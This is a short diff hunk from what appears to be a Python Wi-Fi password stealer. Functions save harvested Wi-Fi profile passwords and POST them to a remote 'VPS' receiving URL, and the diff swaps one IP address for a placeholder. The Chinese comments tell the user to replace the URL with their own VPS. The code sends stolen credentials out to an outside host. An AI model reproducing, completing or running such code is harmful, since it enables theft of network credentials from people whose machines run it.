@@ -40,7 +40,7 @@ def save_passwords_to_file(profiles, filename):
 
 def send_data_to_vps(data):
     try:
-        url = "http://119.45.61.6/receive_wifi_data"  # 替换为你的VPS接收数据的URL
+        url = "http://1.2.3.4/receive_wifi_data"  # 替换为你的VPS接收数据的URL
         response = requests.post(url, json=data)
         if response.status_code == 200:
             print("数据成功发送到VPS")
